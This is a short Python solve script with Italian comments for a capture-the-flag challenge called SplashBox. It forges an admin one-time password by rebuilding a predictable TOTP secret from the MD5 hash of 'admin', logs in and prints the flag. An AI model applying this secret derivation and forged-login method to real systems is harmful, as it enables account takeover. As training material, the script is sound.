import requests, bs4

otp = '859961' #da aggiornare, la otp si ottiene con: otpauth://totp/SplashBox:admin?secret=giytemzsmyzdsn3bgu3wcnlbg42dgobzgrqtazjume4damlgmmzq&issuer=SplashBox
#               il secret è il risultato dell'hash md5 della stringa admin encodata in base32 (importante: usare le minuscole e togliere l'uguale)

s = requests.session()
s.post(f'http://splashbox.challs.olicyber.it/otp.php', data={'username':'admin', 'otpcode':otp})

page = bs4.BeautifulSoup(s.get('http://splashbox.challs.olicyber.it/?page=stash').text, 'html.parser')
for i in page.find_all('p'):
    if 'flag' in i.text:
        print(i.text)
        break